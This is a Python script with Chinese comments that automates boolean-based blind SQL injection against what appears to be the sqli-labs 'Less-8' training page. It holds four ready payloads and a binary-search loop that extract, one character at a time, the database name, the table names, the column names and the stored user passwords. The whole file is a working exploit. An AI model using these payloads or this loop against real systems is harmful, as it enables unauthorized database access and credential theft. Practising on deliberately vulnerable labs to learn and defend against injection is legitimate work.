import requests#用于发送HTTP请求
#url填入sql注入页面网址
url= 'http://URL/Less-8/index.php'
 
res =""#存储爆破出的字符串
 
payload1 ="?id=1'and(ascii(substr((select(database())),{},1))>{})%23" #爆破库名
payload2 ="?id=1'and(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='security')),{},1))>{})%23"#爆破表名
payload3 ="?id=1'and(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema='security')and(table_name='users')),{},1))>{})%23" #爆破字段名
payload4 ="?id=1'and(ascii(substr((select(group_concat(password))from(security.users)),{},1))>{})%23"   #爆破字段数据
for i in range(1,1000):
    low = 32 #空格 ASCII码
    high = 128 #DEL
    mid =(low + high) // 2 #初始化二分范围
    while(low < high):
        #根据上面要执行的操作选择对应的payload
        #payload = payload1.format(i,mid)  
        payload = payload2.format(i,mid)  
        #payload = payload3.format(i,mid)  
        #payload = payload4.format(i,mid)
 
        new_url = url + payload
        r = requests.get(new_url)
        if "You are in..........." in r.text:
        #填入查询正确时的回显内容
            low = mid + 1
        else:
            high = mid
        mid = (low + high) //2
    if (mid == 32 or mid == 132):
        break
    res +=chr(mid)
    print(res)
print(res)
